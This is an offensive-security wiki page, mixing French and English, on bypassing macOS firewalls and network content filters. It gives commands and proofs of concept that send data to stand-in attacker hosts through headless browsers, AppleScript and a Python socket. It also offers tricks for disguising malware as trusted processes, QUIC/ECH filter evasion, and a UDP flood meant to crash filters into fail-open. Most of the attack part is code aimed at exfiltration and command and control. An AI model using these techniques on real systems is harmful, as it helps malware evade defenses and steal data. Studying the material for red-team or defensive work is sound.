# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

The following techniques were found working in some macOS firewall apps.

### Abusing whitelist names

- Par exemple, appeler le malware avec des noms de processus macOS bien connus comme **`launchd`**

### Synthetic Click

- Si le firewall demande la permission à l'utilisateur, faire en sorte que le malware **simule un clic sur Allow**

### **Use Apple signed binaries**

- Comme **`curl`**, mais aussi d'autres comme **`whois`**

### Well known apple domains

- Le firewall pourrait autoriser des connexions vers des domaines Apple bien connus tels que **`apple.com`** ou **`icloud.com`**. Et iCloud pourrait être utilisé comme un C2.

### Generic Bypass

Quelques idées pour essayer de bypasser les firewalls

### Check allowed traffic

Connaître le trafic autorisé vous aidera à identifier les domaines potentiellement en liste blanche ou quelles applications sont autorisées à y accéder
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuser le DNS

Les résolutions DNS sont effectuées via l'application signée **`mdnsreponder`** qui sera probablement autorisée à contacter les serveurs DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via les applications de navigateur

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Si vous pouvez **inject code into a process** qui est autorisé à se connecter à n'importe quel serveur, vous pouvez contourner les protections du firewall :

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Récentes vulnérabilités de bypass du firewall macOS (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
En juillet 2024, Apple a corrigé un bug critique dans Safari/WebKit qui a perturbé le « Web content filter » système utilisé par les contrôles parentaux Screen Time.
Un URI spécialement conçu (par exemple, avec “://” doublement encodé en URL) n'est pas reconnu par l'ACL de Screen Time mais est accepté par WebKit, de sorte que la requête est envoyée sans filtrage. Tout process capable d'ouvrir une URL (y compris du code sandboxed ou unsigned) peut donc atteindre des domains qui sont explicitement bloqués par l'utilisateur ou par un profil MDM.

Test pratique (système non corrigé) :
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) bug d'ordonnancement des règles dans les premières versions de macOS 14 “Sonoma”
Pendant le cycle bêta de macOS 14, Apple a introduit une régression dans le wrapper userspace autour de **`pfctl`**.
Les règles ajoutées avec le mot-clé `quick` (utilisé par de nombreux kill-switches VPN) étaient silencieusement ignorées, provoquant des leaks de trafic même lorsque la GUI VPN/firewall indiquait *blocked*. Le bug a été confirmé par plusieurs fournisseurs VPN et corrigé dans RC 2 (build 23A344).

Vérification rapide de leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abuser des services auxiliaires signés par Apple (obsolète – pré-macOS 11.2)
Avant macOS 11.2, la **`ContentFilterExclusionList`** permettait à environ 50 binaires Apple tels que **`nsurlsessiond`** et l'App Store de contourner tous les pare-feux à filtrage de sockets implémentés avec le Network Extension framework (LuLu, Little Snitch, etc.).
Un malware pouvait simplement lancer un processus exclu — ou y injecter du code — et acheminer son propre trafic via la socket déjà autorisée. Apple a complètement supprimé la liste d'exclusion dans macOS 11.2, mais la technique reste pertinente sur les systèmes qui ne peuvent pas être mis à jour.

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH pour contourner les filtres de domaine de Network Extension (macOS 12+)
Les NEFilter Packet/Data Providers se basent sur le TLS ClientHello (SNI/ALPN). Avec **HTTP/3 over QUIC (UDP/443)** et **Encrypted Client Hello (ECH)**, le SNI reste chiffré, NetExt ne peut pas parser le flux, et les règles basées sur le nom d'hôte échouent souvent en fail-open, permettant au malware d'atteindre des domaines bloqués sans toucher au DNS.

PoC minimal:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.

### macOS 15 “Sequoia” Network Extension instabilité (2024–2025)
Les premières builds 15.0/15.1 plantent les filtres tiers **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, etc.). Lorsque le filtre redémarre, macOS supprime ses règles de flux et de nombreux produits passent en fail-open. En submergeant le filtre avec des milliers de flux UDP courts (ou en forçant QUIC/ECH), on peut provoquer à plusieurs reprises le plantage et laisser une fenêtre pour le C2/exfil pendant que l'GUI affirme toujours que le firewall est actif.

Reproduction rapide (environnement de test sécurisé) :
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Conseils d'outillage pour macOS moderne

1. Inspectez les règles PF actuelles générées par les firewalls GUI :
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Énumérez les binaires qui possèdent déjà l'entitlement *outgoing-network* (utile pour piggy-backing) :
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Enregistrez par programmation votre propre Network Extension content filter en Objective-C/Swift.
Un PoC rootless minimal qui redirige des paquets vers un socket local est disponible dans le code source de **LuLu** de Patrick Wardle.

## Références

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
